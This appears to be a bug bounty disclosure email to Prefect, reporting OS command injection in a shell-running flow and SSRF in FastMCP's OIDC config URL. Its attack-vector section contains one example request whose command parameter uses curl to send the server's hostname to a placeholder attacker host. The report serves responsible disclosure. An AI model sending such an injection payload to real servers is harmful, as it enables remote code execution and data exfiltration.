# Prefect Bug Bounty Submission

**To:** bugbounty@prefect.io
**From:** Iliass Lamti — Manadger Tech SARL
**Subject:** Security Vulnerability Report: Prefect RCE + FastMCP SSRF

---

## Report 1: Prefect RCE via `run_shell_process` Flow (Critical)

**Affected:** Prefect Open Source (22.5K⭐)
**File:** `src/prefect/cli/shell.py:76`
**CWE:** CWE-78 (OS Command Injection)
**CVSS:** 9.8 (Critical)

### Summary

Prefect's `run_shell_process` flow executes shell commands via `subprocess.Popen(command, shell=True)` with no input sanitization. Any authenticated user with `RUN_FLOW` permission can achieve RCE on the Prefect server.

### Vulnerability Details

```python
@flow
def run_shell_process(command: str, ...):
    ...
    with subprocess.Popen(command, shell=True, ...) as process:
```

The `command` parameter passes directly to `subprocess.Popen(shell=True)` without sanitization, allowlisting, or escaping.

### Attack Vector

```
POST /api/flow_runs/
{"deployment_id": "...", "parameters": {"command": "curl http://attacker/$(cat /etc/hostname)"}}
```

### Full Report

See attached: `Prefect_Shell_RCE.md`

---

## Report 2: FastMCP OIDC SSRF via Config URL (High)

**Affected:** FastMCP (25.5K⭐) — now a Prefect product
**File:** `fastmcp/server.py` (see details in attached report)
**CWE:** CWE-918 (Server-Side Request Forgery)

### Summary

FastMCP's OIDC proxy configuration accepts a `config_url` parameter that is fetched server-side without URL validation. An attacker who can control the OIDC configuration (or trick an admin into setting a malicious URL) can trigger SSRF to internal services.

### Full Report

See attached: `FastMCP_OIDC_SSRF.md`

---

## Researcher

**Name:** Iliass Lamti
**Organization:** Manadger Tech SARL
**GitHub:** https://github.com/Ilyasslamti
**Email:** [your-email]
**Wallet (USDC):** 0xD0366D78055b8c637c44d769D1A1371106d13552

---

## Disclosure

I have followed responsible disclosure:
- FastMCP issue was publicly reported as #4294 at jlowin's request to use secure channel
- No public exploit code has been released
- I am happy to provide additional details and assist with fixes

Best regards,
Iliass Lamti
